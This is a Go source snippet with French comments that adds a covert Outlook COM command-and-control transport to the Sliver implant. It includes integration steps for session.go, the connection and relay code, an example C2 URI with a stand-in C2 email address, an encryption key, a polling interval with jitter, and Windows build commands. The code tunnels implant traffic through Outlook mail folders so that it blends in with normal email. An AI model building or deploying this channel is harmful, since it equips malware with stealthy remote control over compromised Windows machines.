// SNIPPET D'INTÉGRATION POUR transports/session.go
// Ce fichier contient le code à ajouter dans session.go pour intégrer le transport Outlook

package transports

/*
INSTRUCTIONS:
============

1. Ajouter cet import en haut du fichier session.go:

	// {{if .Config.IncludeOutlook}}
	"github.com/bishopfox/sliver/implant/sliver/transports/outlook"
	// {{end}}

2. Ajouter ce case dans la fonction StartConnectionLoop(), dans le switch uri.Scheme:

	case "outlook":
		// *** OUTLOOK COM ***
		// {{if .Config.IncludeOutlook}}
		connection, err = outlookConnect(uri)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[outlook] Connection failed %s", err)
			// {{end}}
			continue
		}
		// {{end}} - IncludeOutlook

3. Ajouter cette fonction à la fin du fichier session.go:
*/

// {{if .Config.IncludeOutlook}}
func outlookConnect(uri *url.URL) (*Connection, error) {
	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan struct{}, 1)

	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		uri:     uri,
		IsOpen:  false,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[outlook] lost connection, cleanup...")
			// {{end}}
			ctrl <- struct{}{}
			close(recv)
		},
	}

	connection.Stop = func() error {
		// {{if .Config.Debug}}
		log.Printf("[outlook] Stop()")
		// {{end}}
		connection.Cleanup()
		return nil
	}

	connection.Start = func() error {
		// {{if .Config.Debug}}
		log.Printf("[outlook] Connecting to Outlook COM...")
		// {{end}}

		// Parser la config depuis l'URI
		config, err := outlook.ParseOutlookURI(uri)
		if err != nil {
			return fmt.Errorf("failed to parse outlook config: %w", err)
		}

		// Créer le transport Outlook
		transport, err := outlook.NewOutlookTransport(config)
		if err != nil {
			return fmt.Errorf("failed to create outlook transport: %w", err)
		}

		// Créer l'adaptateur pour connecter aux channels Sliver
		adapter := outlook.NewSliverTransportAdapter(transport)

		connection.IsOpen = true

		// Démarrer l'adaptateur
		ctx := context.Background()
		if err := adapter.Start(ctx); err != nil {
			return fmt.Errorf("failed to start outlook adapter: %w", err)
		}

		// Goroutine pour transférer les envelopes Send → Outlook
		go func() {
			defer connection.Cleanup()
			for envelope := range send {
				// {{if .Config.Debug}}
				log.Printf("[outlook] send envelope type %d", envelope.Type)
				// {{end}}

				// Envoyer via l'adaptateur
				select {
				case adapter.GetSendChan() <- envelope:
				case <-ctrl:
					return
				}
			}
		}()

		// Goroutine pour transférer Outlook → envelopes Recv
		go func() {
			defer connection.Cleanup()
			for {
				select {
				case envelope := <-adapter.GetRecvChan():
					// {{if .Config.Debug}}
					log.Printf("[outlook] recv envelope type %d", envelope.Type)
					// {{end}}

					recv <- envelope

				case <-ctrl:
					return
				}
			}
		}()

		return nil
	}

	return connection, nil
}

// {{end}} - IncludeOutlook

/*
EXEMPLE D'URI OUTLOOK:
=====================

outlook://c2@example.com?session=f47ac10b-58cc-4372-a567-0e02b2c3d479&key=a1b2c3d4e5f6...&folder=16&interval=60s&jitter=30&debug=true

Paramètres:
- c2@example.com : Email du serveur C2
- session : Session ID unique (UUID)
- key : Clé de chiffrement AES-256 en hex (64 caractères)
- folder : Type de dossier Outlook (6=Inbox, 16=Drafts)
- interval : Intervalle de polling (ex: 60s, 2m)
- jitter : Pourcentage de jitter (0-100)
- delete : Supprimer emails après lecture (true/false)
- retries : Nombre max de retry (défaut: 3)
- debug : Mode debug (true/false)

EXEMPLE DE CONFIGURATION C2:
============================

Dans le générateur d'implant Sliver, ajouter:

{
  "c2": [
    {
      "url": "outlook://c2@example.com?session=xxx&key=yyy&folder=16&interval=60s"
    }
  ]
}

BUILD TAGS:
===========

Pour compiler avec le support Outlook:

GOOS=windows GOARCH=amd64 go build -tags outlook -o sliver-outlook.exe

Note: Le transport Outlook nécessite:
- Windows (dépendance COM)
- Microsoft Outlook installé
- go-ole package: go get github.com/go-ole/go-ole
*/
